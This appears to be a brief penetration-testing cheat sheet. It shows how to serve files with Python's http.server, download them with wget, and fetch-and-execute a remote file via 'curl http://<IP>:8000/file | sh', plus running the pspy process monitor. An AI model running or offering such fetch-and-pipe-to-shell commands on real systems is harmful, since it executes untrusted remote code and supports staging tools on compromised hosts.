# Python

We can use Python for a variety of tasks, including:

## Start a web server

```bash
python3 -m http.server 8000
```

## Download a file from the web server

```bash
wget http://<IP>:8000/file
```

## Execute a file from the web server

```bash
curl http://<IP>:8000/file | sh
```

## Monitor a file

We can use `pspy` to monitor a file.

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64 <FILE>
```